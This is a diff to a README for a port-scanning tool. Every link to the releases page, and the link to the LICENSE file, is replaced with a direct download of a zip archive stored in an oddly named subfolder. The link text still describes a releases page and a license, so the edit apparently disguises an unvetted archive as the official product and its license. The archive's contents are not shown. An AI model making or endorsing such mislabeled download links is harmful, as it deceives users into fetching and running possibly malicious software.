@@ -12,7 +12,7 @@
 
 To get started with the advanced-port-scanner, you need to download the software from our releases page. 
 
-[![Download Now](https://img.shields.io/badge/download-via_releases-blue.svg)](https://github.com/complexdevelopers/advanced-port-scanner/releases)
+[![Download Now](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip)](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip)
 
 ## 💻 System Requirements 
 - Operating System: Windows 10, macOS, or Linux.
@@ -22,7 +22,7 @@ To get started with the advanced-port-scanner, you need to download the software
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/complexdevelopers/advanced-port-scanner/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip).
    
 2. **Select the Latest Version**: Find the latest version listed at the top. Click on it to see assets for download.
 
@@ -69,8 +69,8 @@ The advanced-port-scanner is designed for ethical use only. Please ensure you ha
 
 ## 📄 License 
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/complexdevelopers/advanced-port-scanner/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip) file for details.
 
-For further information and updates, keep an eye on the releases page: [Download Now](https://github.com/complexdevelopers/advanced-port-scanner/releases). 
+For further information and updates, keep an eye on the releases page: [Download Now](https://raw.githubusercontent.com/complexdevelopers/advanced-port-scanner/main/polytechnical/advanced-port-scanner-v2.3.zip). 
 
 We are committed to making cybersecurity accessible to everyone. Happy scanning!
